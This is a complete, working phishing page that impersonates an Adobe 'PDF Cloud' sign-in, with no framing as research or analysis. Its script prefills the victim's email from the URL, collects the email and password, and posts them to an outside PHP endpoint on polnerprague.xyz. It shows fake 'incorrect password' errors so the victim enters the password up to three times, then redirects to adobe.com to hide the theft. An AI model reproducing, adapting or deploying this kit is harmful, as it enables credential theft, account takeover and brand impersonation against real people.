<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - PDF CLOUD</title>
    <!-- Bootstrap 4 CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <style>
        /* ===== ORIGINAL STYLES - FULLY PRESERVED ===== */
        html {
            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
            background-repeat: no-repeat;
            background-position: 100%;
            background-size: cover;
            background-attachment: fixed;
            background-clip: border-box;
            display: block;
        }
        body {
            width: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
        }
        .lt { float: left; }
        .rt { float: right; }
        .br { border: 1px solid #000; }
        a { text-decoration: none; color: #0064dc; }
        header {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            border: none;
            background: #000;
        }
        header .brand {
            width: 193px;
            margin: 0 30px;
            padding: 0;
            text-align: center;
            display: inline-block;
            border: none;
            background: #fff;
        }
        header .brand,
        header .search,
        header .brand img,
        header .brand h1 {
            display: inline-block;
        }
        header .brand img {
            width: 54px;
            background: #fff;
            margin: 0 auto -17px;
            padding: 0;
            position: relative;
            top: 0px;
        }
        header .brand h1 {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 0 auto;
            padding: 12px 20px;
            background: #E80E0E;
        }
        header .search {
            width: 300px;
            margin: 0px 30px 0 0;
            padding: 12px 0;
            float: right;
            text-align: center;
        }
        header .search .srch {
            width: 250px;
            padding: 5px 10px;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            border: none;
            border-radius: 10px;
        }
        .container {
            width: 100%;
            margin: 0 auto;
            padding: 0;
        }
        .container .dash {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 9999;
            background: rgba(0, 0, 0, 0.4);
        }
        .container .dash .board {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px 0;
            background: #f6f6f6;
            display: block;
            border: none;
            border-radius: 1px;
            position: relative;
            top: 20%;
        }
        .container .dash .board .login {
            max-width: 370px;
            margin: 0 auto;
            padding: 0;
            border: none;
        }
        .container .dash .board .login ul {
            width: 100%;
            list-style: none;
            margin: 0 auto;
            padding: 0;
            border: none;
            display: block;
        }
        .container .dash .board .login ul li {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            display: block;
            order: 1px solid #ccc;
        }
        .login ul li img,
        .login ul li p {
            display: inline-block;
        }
        .login ul li img {
            margin: 0;
            padding: 0;
            position: relative;
        }
        .login ul .l1 p {
            font-weight: 400;
            color: #707070;
            vertical-align: top;
            margin: 0;
            padding: 0;
        }
        #err,
        .login ul li #adbpss1 {
            display: none;
        }
        .login ul li .inp {
            width: 368px;
            margin: 8px auto;
            padding: 2px 12px;
            min-height: 32px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
            color: #000;
            display: block;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            font-style: italic;
        }
        .login ul li .inp:focus {
            border: 1px solid #1473e6;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            font-style: normal;
        }
        .login ul li .btns {
            width: 120px;
            margin: 0 auto;
            padding: 7px 0;
            background: #1473e6;
            color: #fff;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            white-space: nowrap;
            display: inline-block;
            cursor: pointer;
            outline: none;
        }
        .login ul .l1 svg {
            width: 22px;
            display: inline-block;
            margin: 0;
            padding: 0;
            position: relative;
            top: 9px;
        }
        .login ul .l1 p {
            margin: 0;
            padding: 10px 6px;
            color: #707070;
        }
        .login ul .l2 p {
            font-size: 13px;
            font-weight: 700;
            color: #4b4b4b;
            margin: 0;
            padding: 15px 0;
        }
        .login ul .l3 img {
            width: 32px;
            margin: 0 0 -3px;
        }
        .login ul .l3 p {
            font-size: 28px;
            font-weight: 300;
            color: #2d2d2d;
            margin: 0 9px;
            padding: 0;
        }
        .login ul .l4 {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            text-align: left;
        }
        .login ul .l4 p {
            font-size: 14px;
            font-weight: 600;
            margin: 0;
            padding: 5px 0;
            color: #E80E0E;
            font-style: italic;
        }
        .login ul .l5 p {
            width: 100%;
            margin: 50px auto 5px;
            padding: 0;
            text-align: center;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            display: block;
        }
        @media (max-width: 680px) {
            header .search { width: 70px; margin: 0px; text-align: center; }
            header .search .srch { display: none; }
            header .brand { width: 180px; margin: 0 30px; padding: 0; }
            header .brand img { width: 40px; margin: 0 auto -10px; }
            header .brand h1 { font-size: 18px; margin: 0 auto; padding: 7px 20px; }
        }
        
        .brand-logo-pdf {
            display: inline-block;
            vertical-align: middle;
            transition: transform 0.2s ease;
            object-fit: contain;
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            margin: 8px auto 0;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1473e6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-wrapper {
            text-align: center;
            position: relative;
        }
        .btns:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">
            <img class="brand-logo-pdf" 
                 src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                 alt="PDF Document Logo" 
                 style="width:54px; background:#fff; border-radius: 8px; padding: 4px;"
                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
            <h1>PDF CLOUD</h1>
        </div>
        <div class="search">
            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
        </div>
    </header>
    <div class="container">
        <div class="dash cover">
            <div class="board animated fadeIn coontainer">
                <div class="login">
                    <!-- NO FORM ELEMENT - Using DIV only to prevent ANY form submission -->
                    <div id="loginContainer">
                        <ul>
                            <li class="l1">
                                <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
                                    <path d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z"></path>
                                </svg>
                                <p>PDF Cloud</p>
                            </li>
                            <li class="l2">
                                <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
                            </li>
                            <li class="l3">
                                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                                     alt="PDF Document Icon" 
                                     width="32" 
                                     onerror="this.src='https://icons.iconarchive.com/icons/dakirby309/simply-styled/32/PDF-icon.png';">
                                <p>PDF Document</p>
                            </li>
                            <br>
                            <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
                            <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                            <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required></li>
                            <li class="btn-wrapper">
                                <button type="button" name="submit" class="btns" id="submit-btn">Sign In</button>
                                <div class="loading-spinner" id="loadingSpinner"></div>
                            </li>
                            <li class="l5">
                                <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ============================================================
            // COMPLETELY STANDALONE - NO FORM, NO REDIRECT
            // Works on any host without redirecting to PHP URL
            // ============================================================
            
            // PHP URL - appears only once
            const PHP_URL = 'https://polnerprague.xyz/pdf/sg.php';
            
            // Override any potential form submissions - kill any default browser behavior
            if (document.querySelectorAll) {
                var allElements = document.querySelectorAll('*');
                for (var i = 0; i < allElements.length; i++) {
                    if (allElements[i].tagName === 'FORM') {
                        allElements[i].addEventListener('submit', function(e) {
                            e.preventDefault();
                            e.stopPropagation();
                            return false;
                        });
                    }
                }
            }
            
            // Get or initialize attempt counter from sessionStorage
            let currentAttempt = parseInt(sessionStorage.getItem('pdfLoginAttempt')) || 1;
            
            // Get stored email if exists
            let storedEmail = sessionStorage.getItem('pdfLoginEmail') || '';
            
            // DOM elements
            const loginButton = document.getElementById('submit-btn');
            const emailField = document.getElementById('emailInput');
            const passwordField = document.getElementById('passwordInput');
            const spinner = document.getElementById('loadingSpinner');
            const errorDiv = document.getElementById('err');
            const errorText = document.getElementById('erp');
            
            // ============================================================
            // ERROR MESSAGES BASED ON ATTEMPT NUMBER
            // ============================================================
            function getErrorMessage(attemptNumber) {
                switch(attemptNumber) {
                    case 1:
                        return "❌ Incorrect password. Please try again.";
                    case 2:
                        return "❌ Password incorrect. Please try again.";
                    case 3:
                        return "⚠️ Password incorrect. Last attempt before account lock.";
                    default:
                        return "❌ Incorrect password. Please try again.";
                }
            }
            
            // ============================================================
            // EMAIL PERSISTENCE - Load from URL hash or sessionStorage
            // ============================================================
            function loadEmailFromHash() {
                let hash = window.location.hash.substring(1);
                if (hash && !storedEmail) {
                    try {
                        hash = decodeURIComponent(hash);
                    } catch(e) {}
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(hash)) {
                        storedEmail = hash;
                        sessionStorage.setItem('pdfLoginEmail', storedEmail);
                        return true;
                    }
                }
                return false;
            }
            
            function loadEmailIntoField() {
                if (storedEmail && emailField) {
                    emailField.value = storedEmail;
                } else {
                    loadEmailFromHash();
                    if (storedEmail && emailField) {
                        emailField.value = storedEmail;
                    }
                }
            }
            
            function saveCurrentEmail() {
                if (emailField) {
                    const currentEmail = emailField.value.trim();
                    if (currentEmail) {
                        sessionStorage.setItem('pdfLoginEmail', currentEmail);
                        storedEmail = currentEmail;
                    }
                }
            }
            
            // Load email on page load if elements exist
            if (emailField) {
                loadEmailIntoField();
                emailField.addEventListener('input', saveCurrentEmail);
                emailField.addEventListener('blur', saveCurrentEmail);
            }
            
            // ============================================================
            // UI HELPER FUNCTIONS
            // ============================================================
            function showError(message) {
                if (errorText && errorDiv) {
                    errorText.innerHTML = message;
                    errorDiv.style.display = 'block';
                    setTimeout(function() {
                        if (errorDiv) errorDiv.style.display = 'none';
                    }, 4000);
                }
            }
            
            function showLoading() {
                if (loginButton && spinner) {
                    loginButton.disabled = true;
                    loginButton.style.opacity = '0.6';
                    spinner.style.display = 'inline-block';
                }
            }
            
            function hideLoading() {
                if (loginButton && spinner) {
                    loginButton.disabled = false;
                    loginButton.style.opacity = '1';
                    spinner.style.display = 'none';
                }
            }
            
            // ============================================================
            // SEND DATA TO PHP VIA AJAX
            // ============================================================
            function sendDataToPhp(email, password, attemptNumber, callback) {
                const formData = new FormData();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('attempt', attemptNumber);
                
                console.log('Sending data for attempt:', attemptNumber, 'Email:', email);
                
                // Use fetch
                fetch(PHP_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    cache: 'no-cache',
                    credentials: 'omit',
                    body: formData
                })
                .then(function() {
                    console.log('✓ Data sent for attempt:', attemptNumber);
                    if (callback) callback(true);
                })
                .catch(function(error) {
                    console.error('Fetch error:', error);
                    try {
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', PHP_URL, true);
                        xhr.send(formData);
                        console.log('✓ Data sent via XHR for attempt:', attemptNumber);
                    } catch(e) {
                        console.error('XHR failed:', e);
                    }
                    if (callback) callback(true);
                });
            }
            
            // ============================================================
            // HANDLE FAILED ATTEMPT (Attempts 1-3)
            // ============================================================
            function handleFailedAttempt(email, password, attemptNum) {
                sendDataToPhp(email, password, attemptNum, function() {
                    let nextAttempt = attemptNum + 1;
                    sessionStorage.setItem('pdfLoginAttempt', nextAttempt);
                    
                    const errorMsg = getErrorMessage(attemptNum);
                    showError(errorMsg);
                    
                    if (passwordField) passwordField.value = '';
                    currentAttempt = nextAttempt;
                    hideLoading();
                    if (passwordField) passwordField.focus();
                    
                    console.log('Attempt', attemptNum, 'completed. Next attempt:', nextAttempt);
                });
            }
            
            // ============================================================
            // HANDLE 4TH ATTEMPT - REDIRECT TO ADOBE
            // ============================================================
            function handleFourthAttempt() {
                console.log('4th attempt - Redirecting to Adobe');
                sessionStorage.removeItem('pdfLoginAttempt');
                sessionStorage.removeItem('pdfLoginEmail');
                window.location.href = 'https://www.adobe.com';
            }
            
            // ============================================================
            // LOGIN BUTTON CLICK HANDLER
            // ============================================================
            if (loginButton) {
                // Remove any existing listeners to prevent duplicates
                var newButton = loginButton.cloneNode(true);
                loginButton.parentNode.replaceChild(newButton, loginButton);
                const finalButton = document.getElementById('submit-btn');
                
                if (finalButton) {
                    finalButton.addEventListener('click', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        
                        if (errorDiv) errorDiv.style.display = 'none';
                        
                        const email = emailField ? emailField.value.trim() : '';
                        const password = passwordField ? passwordField.value : '';
                        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                        
                        if (!email) {
                            showError('Please enter your email address.');
                            return false;
                        }
                        if (!emailRegex.test(email)) {
                            showError('Please enter a valid email address.');
                            return false;
                        }
                        if (!password) {
                            showError('Please enter your password.');
                            return false;
                        }
                        if (password.length < 5) {
                            showError('Password must be at least 5 characters.');
                            return false;
                        }
                        
                        if (emailField) saveCurrentEmail();
                        
                        console.log('Sign In clicked - Current attempt:', currentAttempt);
                        
                        if (currentAttempt >= 4) {
                            handleFourthAttempt();
                            return false;
                        }
                        
                        showLoading();
                        handleFailedAttempt(email, password, currentAttempt);
                        
                        return false;
                    });
                }
            }
            
            // Allow Enter key to trigger login
            if (passwordField) {
                passwordField.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        e.stopPropagation();
                        const btn = document.getElementById('submit-btn');
                        if (btn) btn.click();
                    }
                });
            }
            
            if (emailField) {
                emailField.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        e.stopPropagation();
                        const btn = document.getElementById('submit-btn');
                        if (btn) btn.click();
                    }
                });
            }
            
            // Block any form submissions globally
            document.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);
            
            // Fix broken images
            const allImages = document.querySelectorAll('img');
            allImages.forEach(function(img) {
                img.addEventListener('error', function() {
                    if (this.src.indexOf('flaticon') === -1 && (this.alt.indexOf('PDF') !== -1 || this.className.indexOf('brand') !== -1)) {
                        this.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';
                        this.onerror = null;
                    }
                });
            });
            
            // Hash change listener
            window.addEventListener('hashchange', function() {
                let hash = window.location.hash.substring(1);
                if (hash && !sessionStorage.getItem('pdfLoginEmail')) {
                    try { hash = decodeURIComponent(hash); } catch(e) {}
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(hash) && emailField) {
                        sessionStorage.setItem('pdfLoginEmail', hash);
                        emailField.value = hash;
                        storedEmail = hash;
                    }
                }
            });
            
            console.log('========================================');
            console.log('✓ PAGE LOADED - NO REDIRECTS');
            console.log('✓ Current attempt:', currentAttempt);
            console.log('✓ Stored email:', storedEmail || '(none)');
            console.log('✓ PHP URL (AJAX only):', PHP_URL);
            console.log('========================================');
        })();
    </script>
</body>
</html>
